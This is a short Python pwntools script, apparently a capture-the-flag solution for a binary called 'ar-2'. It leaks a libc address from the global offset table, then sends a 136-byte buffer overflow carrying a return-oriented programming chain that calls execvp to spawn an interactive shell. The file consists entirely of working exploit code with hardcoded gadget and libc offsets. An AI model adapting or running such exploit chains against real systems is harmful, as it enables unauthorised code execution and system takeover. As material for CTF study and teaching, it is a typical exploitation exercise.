#!/usr/bin/python

from pwn import *
import time

poprdi = 0xa33 #: pop rdi ; ret
poprsi = 0xa31 #: pop rsi ; pop r15 ; ret

p = process("./ar-2")
p.sendline("8")
base = 0x400000
p.recv(timeout=5)
p.sendline("0x601018")
poprdi = base + poprdi
poprsi = base + poprsi
puts = base + 0x6a0
gotputs = base + 0x201018
p.recvline(timeout=5)

#p.sendline("A" * 136  + p64(poprdi) + p64(gotputs) + p64(puts) + p6)

res = p.recv(timeout=5)
res = res[:8]
libcbase = u64(res) - 0x6f690

poprdx = libcbase + 0x0000000000001b92
sh = libcbase + 0x11e70
execvp = libcbase + 0xccbc0
p.sendline("A" * 136  + p64(poprdi) + p64(sh) + p64(poprsi) + p64(0)*2 + p64(poprdx) + p64(0) + p64(execvp))
p.interactive()
